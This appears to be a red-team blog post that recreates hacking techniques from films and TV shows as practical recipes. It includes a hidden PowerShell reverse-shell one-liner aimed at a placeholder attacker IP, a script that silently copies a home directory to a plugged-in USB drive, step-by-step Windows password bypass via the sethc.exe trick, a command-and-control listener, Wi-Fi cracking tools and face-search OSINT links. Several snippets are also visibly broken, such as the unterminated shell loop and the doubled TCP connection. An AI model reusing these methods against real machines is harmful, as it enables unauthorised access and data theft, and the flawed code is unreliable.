---
layout: post
title:  "Hacking Methods In Films(RTF0001)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/12.jpg
description: "Hacking Methods In Films"
featured: true
hidden: true
rating: 4.5
---



### COD Ghost

#### auto file copy

One way to steal and copy files from a computer when a USB is plugged in is to use a software tool called "USB Thief". This tool can be downloaded and run from the USB itself, making it difficult to detect. Once installed on the USB, the tool can automatically copy files from the victim's computer onto the USB whenever it is inserted.


```
while true; do if [ -d "/media/usb" ]; then rsync -avzh --progress ~/ /media/usb/ fi sleep 1 done
```


or

```
@echo off set source=C:\ImportantFiles set destination=D:\Backup xcopy /e /y %source% %destination%
```


tools:
https://github.com/Ginray/USB-Dumper


#### xray portable device


The Camero XAVER400 is a handheld through-wall imaging device that uses ultra-wideband (UWB) radar technology to produce a real-time 3D image of objects behind walls. It is designed for use by military, law enforcement, and rescue personnel in situations where it is necessary to quickly and accurately locate people or objects on the other side of walls or barriers.

Novelda XeThru + Arduino


```
#include <SoftwareSerial.h>
SoftwareSerial mySerial(10, 11); // RX, TX
unsigned int distance; 

void setup() {
  Serial.begin(115200); //initialize the serial port
  mySerial.begin(9600); //initialize the XeThru sensor
}

void loop() {
  if(mySerial.available()) {
    char distance_string[6];
    mySerial.readBytesUntil('\n', distance_string, 6); //read the distance from the sensor
    distance = atoi(distance_string); //convert the distance to an integer
    Serial.println(distance); //print the distance to the serial monitor
  }
}

```

#### command and control dongle

Raspberry Pi + web server + reverse proxy+ Metasploit or Cobalt Strike


```
import socket

# Set up socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 8000))
sock.listen(1)

# Main loop
while True:
    conn, addr = sock.accept()
    data = conn.recv(1024).decode()
    if data == 'command1':
        # Execute command1
        pass
    elif data == 'command2':
        # Execute command2
        pass
    elif data == 'command3':
        # Execute command3
        pass
    conn.close()

```


#### Heartbeat Sensor

RTL-SDR dongle + Raspberry Pi

1.  Obtain an SDR: You can purchase an SDR online, such as the RTL-SDR dongle, which is inexpensive and widely used.
    
2.  Install software: Download and install SDR software on your computer or Raspberry Pi. A popular option is Gqrx, which is free and available for multiple platforms.
    
3.  Connect the SDR: Plug the SDR into your computer or Raspberry Pi using a USB port.
    
4.  Run the software: Open the SDR software and configure it to the desired frequency range. You can also adjust other settings, such as sample rate and bandwidth.
    
5.  Scan for frequencies: Use the SDR software to scan for frequencies in the desired range. You can also save and analyze the data using the software.


### Mr.robot


#### Hi-jacking Internet With A Pringles Can

-   Pringles can
-   USB Wi-Fi adapter with a removable antenna
-   N-type female to RP-SMA male pigtail adapter
-   N-type female chassis mount connector
-   Coaxial cable
-   Screws and nuts
-   Electrical tape

To make the directional antenna, you will need to cut a hole in the Pringles can and attach the N-type female chassis mount connector to the can. Next, connect the N-type female to RP-SMA male pigtail adapter to the connector on the can.

Then, attach the USB Wi-Fi adapter to the pigtail adapter using the RP-SMA connector. Finally, attach the coaxial cable to the N-type connector on the chassis mount connector and run the cable to your computer or router.

airmon-ng + airdrop-ng + aircrack-ng


#### bypass windows login


1.  Boot your computer from a Windows installation disk or a bootable USB drive.
2.  Choose the option to repair your computer.
3.  Select Command Prompt from the Advanced options.
4.  Navigate to the C:\Windows\System32 directory.
5.  Rename the sethc.exe file to sethc.exe.bak.
6.  Copy cmd.exe and paste it in the same directory, then rename the copied cmd.exe file to sethc.exe.
7.  Close the Command Prompt and restart the computer.
8.  When the login screen appears, press the Shift key five times to open the Sticky Keys dialog box.
9.  In the dialog box, type "net user [username] *" (replace [username] with the username of the account you want to bypass the password for) and hit Enter.
10.  Enter a new password twice when prompted to do so. Alternatively, you can leave the password field blank to remove the password altogether.
11.  Close the Command Prompt and log in with the new password (or without one, if you chose to remove it).


### kevin 

#### How Hackers Easily Gain Access To Sensitive Information via shared usb cable

scenario #1

1. Bluetooth Adapter
2. Arduino + HC-05
```
char c = 'a';

void setup() {
  Serial.begin(9600);
  pinMode(2, INPUT_PULLUP);
}

void loop() {
  if (digitalRead(2) == LOW) {
    Serial.write(c);
    delay(1000);
  }
}

```
3. reverse shell

```
`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("IP_address",port);$stream=(New-Object System.IO.StreamReader((New-Object System.Net.Sockets.TCPClient("IP_address",port)).GetStream()));[byte[]]$bytes=0..65535|%{0};while(($i=$stream.BaseStream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + "PS " + (pwd).Path + "> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`
```


scenario #2

juice jacking

1.  A victim plugs their phone into a public charging station to charge their phone.
    
2.  The charging station has been rigged with a device that looks like a normal charging port, but is actually a data connection point.
    
3.  Once the phone is connected, the malicious device begins installing malware onto the phone or accessing the phone's data.


### the girl with dragon tatoo

#### sql

```
SELECT DISTINCT v.fname, v.lname, i.year, i.location, i.report_file FROM Incident AS i LEFT JOIN Victim AS v on v.incident_id = i.id LEFT JOIN Keyword AS k ON k.incident_id = i.id WHERE i.year BETWEEN 1947 AND 1966 AND i.type = 'HOMICIDE' AND v.sex = 'F' AND i.status = 'UNSOLVED' AND ( k.keyword IN ('rape', 'decapitation', 'dismemberment', 'fire', 'altar', 'priest', 'prostitute') OR v.fname IN ('Mari', 'Magda') OR SUBSTR(v.fname, 1, 1) = 'R' AND SUBSTR(v.lname, 1, 1) = 'L' );
```


This SQL query retrieves distinct victim first names (fname), last names (lname), incident year (year), incident location (location), and incident report file (report_file) from three tables: Incident, Victim, and Keyword.

The LEFT JOIN keyword table is used to get the keywords associated with each incident, the LEFT JOIN victim table is used to get information about the victims, and the WHERE clause is used to filter the results based on specific criteria.

The following conditions must be met to include a row in the result set:

-   The incident must be a homicide (i.type = 'HOMICIDE')
-   The incident must be unsolved (i.status = 'UNSOLVED')
-   The incident must have occurred between 1947 and 1966 (i.year BETWEEN 1947 AND 1966)
-   The victim must be female (v.sex = 'F')

Additionally, any of the following criteria must be true for the incident to be included:

-   The incident must have a keyword that matches one of the following: 'rape', 'decapitation', 'dismemberment', 'fire', 'altar', 'priest', or 'prostitute' (k.keyword IN ...)
-   The victim's first name must be 'Mari' or 'Magda' (v.fname IN ...)
-   The victim's first name must start with 'R' and the last name must start with 'L' (SUBSTR(v.fname, 1, 1) = 'R' AND SUBSTR(v.lname, 1, 1) = 'L')

The DISTINCT keyword ensures that each row in the result set is unique based on the combination of first name, last name, year, location, and report file.


### Jason Bourne

#### osint visualize

Maltego

+


https://www.osintcombine.com/reverse-image-analyzer
https://face8.ai/faceMaster#fc
https://thispersondoesnotexist.com/
https://seintpl.github.io/AmIReal/
https://fotoforensics.com/
https://extract.pics/
https://chrome.google.com/webstore/detail/fake-profile-detector-dee/jbpcgcnnhmjmajjkgdaogpgefbnokpcc?hl=en-US
https://peakvisor.com/identify-mountains.html#
https://scamsearch.io/#anchorCeckNow
https://vanceai.com/sharpen-ai/
https://neural.love/orders
https://facecheck.id/
https://pimeyes.com/en
https://search4faces.com/vkokn/index.html
https://search4faces.com/en/tt00/index.html
https://snapedit.app/
https://www.pic2map.com/
https://github.com/seintpl/osint



### matrix reloaded

#### sshnuke

emulates the sshnuke program but just for fun

```
#!/bin/sh

# This script emulates the sshnuke program from the Matrix Reloaded

# Author: Nick Young

if [ $# -lt 2 ]; then
  echo "Invalid number of parameters. Usage: sshnuke <ip> -rootpw=\"<rootpw>\""
  exit 1
fi

pw=$2
pw=${pw#"-rootpw="}

echo -n "connecting to $1:ssh ... "
sleep 2
echo "successful."
echo -n "attempting to exploit SSHv1 CRC32 ... "
sleep 5
echo "successful."
echo "resetting root password to \"$pw\""
sleep 2
echo "system open: Access Level <9>"
```

but in real-world routersploit like script could be use

```
./rsf.py
use exploits/
```


### Hoosh-e Siah

#### diy nic


1.  Gather materials: You will need copper wire (about 20-24 gauge), a coaxial cable (with an F connector), pliers, wire cutters, and a soldering iron.
    
2.  Create the antenna: Use the copper wire to create a simple dipole antenna. Cut two pieces of wire to a length of approximately 5 inches each, and strip about 1 inch of insulation from each end. Then, bend each wire in the middle to create a "V" shape, with the two tips of the "V" being about 2-3 inches apart. Use the pliers to bend the wire at the center of the "V" to form a 90-degree angle. This will create a dipole antenna with a balun.
    
3.  Connect the coaxial cable: Solder the center conductor of the coaxial cable to the two ends of the dipole antenna. Then, solder the outer conductor of the coaxial cable to the 90-degree angle formed by the balun.
    
4.  Connect the antenna to your mobile device: Connect the F connector on the other end of the coaxial cable to a signal booster, if you have one, or directly to your mobile device using a compatible adapter.
    
5.  Test the antenna: Turn on your mobile device and test the antenna by searching for nearby signals. You may need to adjust the position of the antenna to get the best reception.
